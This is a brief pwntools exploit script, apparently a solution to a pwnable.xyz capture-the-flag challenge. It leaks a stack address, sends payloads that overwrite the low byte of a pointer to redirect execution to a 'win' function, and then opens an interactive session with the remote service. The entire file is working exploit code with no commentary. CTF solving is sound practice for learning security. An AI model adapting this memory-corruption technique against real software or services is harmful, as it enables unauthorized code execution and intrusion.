from pwn import *

#p = process('./challenge')
p = remote("svc.pwnable.xyz", 30012)
e = ELF('./challenge')

win = e.symbols['win'] & 0xff
p.sendafter(b'> ', b"3")
stack = (int(p.recvline()[:-1], 16) - 0xf8) & 0xff
payload = str(win).encode() + b"A" * 0x1d + p8(stack + 9)
p.sendafter(b'> ', payload)
payload = b"1" + b"A" * 0x1f + p8(stack)
p.sendafter(b'> ', payload)
p.interactive()